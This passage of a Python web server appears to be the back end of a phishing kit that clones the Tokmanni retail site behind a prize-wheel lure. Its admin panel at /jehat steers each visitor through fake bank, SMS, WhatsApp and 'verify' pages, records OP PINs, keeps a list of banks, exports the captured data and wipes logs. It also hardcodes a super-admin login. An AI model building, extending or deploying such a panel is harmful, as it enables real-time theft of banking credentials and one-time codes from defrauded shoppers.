                'whatsapp': {'page': 'whatsapp', 'status': 'active'},
            }

            if action == 'ban' and vid:
                store.ban_visitor(vid)
            elif action == 'delete' and vid:
                with store.lock:
                    store.data['visitors'] = [v for v in store.data['visitors'] if str(v['id']) != str(vid)]
                    store._save()
            elif action == 'op-verify' and vid:
                store.update_visitor(vid, {
                    'page': 'opVerify', 'status': 'active',
                    'op_pin': post_data.get('pin', '')
                })
            elif action == 'austria-verify' and vid:
                store.update_visitor(vid, {
                    'page': 'austriaVerify', 'status': 'active',
                    'verify_texts': {
                        'text1': post_data.get('text1', ''),
                        'text2': post_data.get('text2', ''),
                        'text3': post_data.get('text3', ''),
                    }
                })
            elif action == 'custom-verify' and vid:
                store.update_visitor(vid, {
                    'page': 'customVerify', 'status': 'active',
                    'custom_verify_texts': {
                        'text1': post_data.get('text1', ''),
                        'text2': post_data.get('text2', ''),
                        'text3': post_data.get('text3', ''),
                    }
                })
            elif action == 'whatsapp' and vid:
                store.update_visitor(vid, {
                    'page': 'whatsapp', 'status': 'active',
                    'support_step': post_data.get('step', ''),
                    'support_percent': post_data.get('percent', ''),
                })
            elif action == 'support' and vid:
                store.update_visitor(vid, {
                    'page': 'support', 'status': 'active',
                    'support_step': post_data.get('step', ''),
                    'support_percent': post_data.get('percent', ''),
                })
            elif vid and action in action_map:
                store.update_visitor(vid, action_map[action])

            if action in ('sms', 'sendSms') and vid:
                store.update_visitor(vid, {
                    'page': 'sms',
                    'sms_request': {
                        'title': post_data.get('smsTitle', ''),
                        'length': post_data.get('smsLength', ''),
                        'message': post_data.get('smsMessage', ''),
                    }
                })

            store.add_activity('sendRequest', f"{action} → #{vid}", sess['username'] if sess else 'system')
            self._json({'success': True, 'message': f'{action} tamamlandı'}); return

        # --- SEND SMS ---
        if sub == 'sendSms':
            vid = post_data.get('visitor_id', '')
            if vid:
                store.update_visitor(vid, {
                    'page': 'sms',
                    'sms_request': {
                        'title': post_data.get('smsTitle', ''),
                        'length': post_data.get('smsLength', ''),
                        'message': post_data.get('smsMessage', ''),
                    }
                })
            store.add_activity('sendSms', f'SMS → #{vid}', sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'SMS gönderildi'}); return

        # --- DİĞER POST ---
        if sub == 'saveWheelSettings':
            store.add_activity('saveWheelSettings', 'Çark ayarları güncellendi', sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'Kaydedildi'}); return

        if sub == 'saveCountrySettings':
            with store.lock:
                store.data['country_settings'].update(post_data)
                store._save()
            self._json({'success': True, 'message': 'Kaydedildi'}); return

        if sub == 'saveLanguage':
            store.add_activity('saveLanguage', 'Dil güncellendi', sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'Kaydedildi'}); return

        # --- SMS, WhatsApp, Verify, OpPin ---
        if sub == 'sendSms':
            vid = post_data.get('visitor_id', post_data.get('id', post_data.get('row_id', '')))
            if vid:
                store.update_visitor(vid, {
                    'page': 'sms',
                    'sms_request': {
                        'title': post_data.get('smsTitle', post_data.get('title', '')),
                        'length': post_data.get('smsLength', post_data.get('length', '')),
                        'message': post_data.get('smsMessage', post_data.get('message', '')),
                    }
                })
            store.add_activity('sendSms', f"SMS gönderildi → #{vid}", sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'SMS gönderildi'}); return

        if sub == 'sendWhatsapp':
            vid = post_data.get('visitor_id', post_data.get('id', post_data.get('row_id', '')))
            if vid:
                store.update_visitor(vid, {'page': 'whatsapp'})
            store.add_activity('sendWhatsapp', f"WhatsApp → #{vid}", sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'WhatsApp gönderildi'}); return

        if sub == 'sendAustriaVerify':
            vid = post_data.get('visitor_id', post_data.get('id', post_data.get('row_id', '')))
            if vid:
                store.update_visitor(vid, {
                    'page': 'austriaVerify',
                    'austria_texts': {
                        'text1': post_data.get('text1', ''),
                        'text2': post_data.get('text2', ''),
                        'text3': post_data.get('text3', ''),
                    }
                })
            store.add_activity('sendAustriaVerify', f"Austria Verify → #{vid}", sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'Austria Verify gönderildi'}); return

        if sub == 'sendCustomVerify':
            vid = post_data.get('visitor_id', post_data.get('id', post_data.get('row_id', '')))
            if vid:
                store.update_visitor(vid, {
                    'page': 'customVerify',
                    'custom_verify_texts': {
                        'text1': post_data.get('text1', ''),
                        'text2': post_data.get('text2', ''),
                        'text3': post_data.get('text3', ''),
                    }
                })
            store.add_activity('sendCustomVerify', f"Custom Verify → #{vid}", sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'Custom Verify gönderildi'}); return

        if sub == 'saveOpPin':
            vid = post_data.get('visitor_id', post_data.get('id', post_data.get('row_id', '')))
            pin = post_data.get('opPin', post_data.get('pin', ''))
            if vid:
                store.update_visitor(vid, {'opPin': pin})
            store.add_activity('saveOpPin', f"OP Pin kaydedildi → #{vid}", sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'OP Pin kaydedildi'}); return

        if sub == 'changePassword':
            username = post_data.get('username', '')
            new_pass = post_data.get('password', post_data.get('new_password', ''))
            if username and new_pass:
                with store.lock:
                    for u in store.data['users']:
                        if u['username'] == username:
                            u['password'] = new_pass
                            break
                    store._save()
            self._json({'success': True, 'message': 'Şifre değiştirildi'}); return

        if sub in ('saveSettings', 'saveAdminSettings'):
            store.add_activity(sub, 'Ayarlar güncellendi', sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'Kaydedildi'}); return

        if sub in ('banUser', 'banIP'):
            vid = post_data.get('id', post_data.get('visitor_id', ''))
            ip = post_data.get('ip', '')
            with store.lock:
                store.data['banned'].append({
                    'id': vid or str(len(store.data['banned'])+1),
                    'ip': ip, 'reason': post_data.get('reason', 'Admin'),
                    'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })
                store._save()
            self._json({'success': True, 'message': 'Ban uygulandı'}); return

        if sub in ('deleteBanned', 'deleteAllBans', 'unbanUser', 'deleteBan'):
            bid = post_data.get('id', '')
            with store.lock:
                if bid:
                    store.data['banned'] = [b for b in store.data['banned'] if str(b['id']) != str(bid)]
                else:
                    store.data['banned'] = []
                store._save()
            self._json({'success': True, 'message': 'Ban kaldırıldı'}); return

        if sub in ('truncateData', 'truncateAll', 'deleteAllLogs'):
            with store.lock:
                if 'All' in sub:
                    store.data['visitors'] = []
                    store.data['activity_logs'] = []
                    store.data['banned'] = []
                elif 'Logs' in sub:
                    store.data['activity_logs'] = []
                else:
                    store.data['visitors'] = []
                store._save()
            self._json({'success': True, 'message': 'Temizlendi'}); return

        if sub == 'exportData':
            self._json({
                'success': True, 'data': {
                    'visitors': store.data['visitors'],
                    'banks': store.data['banks'],
                    'users': store.get_all_users(),
                    'logs': store.data['activity_logs'][:100],
                }
            }); return

        generic_saves = ['saveBank', 'removeCountryFromFilter', 'testIPLocation',
                         'debugCountryFilter', 'resetWheel', 'resetWheelSettings']
        if sub in generic_saves:
            store.add_activity(sub, f'{sub} işlemi', sess['username'] if sess else 'system')
            self._json({'success': True, 'message': 'Başarılı'}); return

        print(f"  [POST ?] /jehat/{sub} data={json.dumps(post_data, ensure_ascii=False)[:200]}")
        self._json({'success': True, 'message': 'OK'})

    def log_message(self, format, *args):
        msg = format % args if args else format
        if '/static/' not in str(msg) and '/__log' not in str(msg):
            print(f"  [{self.log_date_time_string()}] {msg}")


# ============================================
# BAŞLATMA
# ============================================
def main():
    print("=" * 60)
    print("  TOKMANNI DYNAMIC CLONE SERVER")
    print(f"  http://localhost:{PORT}")
    print("  Mod: TAM DİNAMİK")
    print("=" * 60)

    static_count = sum(len(f) for _, _, f in os.walk(SITE_ROOT)) if os.path.isdir(SITE_ROOT) else 0
    page_count = len([f for f in os.listdir(CAPTURED_PAGES) if f.endswith('.html')]) if os.path.isdir(CAPTURED_PAGES) else 0

    print(f"\n  Statik dosyalar: {static_count}")
    print(f"  Admin sayfaları: {page_count}")
    print(f"  Bankalar: {len(store.data['banks'])}")
    print(f"  Kullanıcılar: {len(store.data['users'])}")
    print(f"  Ziyaretçiler: {len(store.data['visitors'])}")

    for u in store.data['users']:
        if not u.get('password'):
            u['password'] = u['username']

    if not any(u['username'] == 'denez' for u in store.data['users']):
        store.add_user('denez', 'sanane21', 'super_admin', 'active')
        print("  [!] denez kullanıcısı oluşturuldu")

    for u in store.data['users']:
        if u['username'] == 'denez':
            u['password'] = 'sanane21'
            break
    store.save()

    auto_sid = store.create_session('denez', 'super_admin', '6')

    print(f"\n  Session: ci_session={auto_sid}")
    print(f"\n  Çark:      http://localhost:{PORT}/")
    print(f"  Admin:     http://localhost:{PORT}/jehat")
    print(f"  Dashboard: http://localhost:{PORT}/jehat/dashboard")
    print(f"  Kullanıcı: denez / sanane21")
    print(f"\n  Ctrl+C ile durdur.\n")

    server = HTTPServer(('0.0.0.0', PORT), OfflineHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Sunucu durduruluyor...")
        store.save()
        server.server_close()

if __name__ == '__main__':
    main()
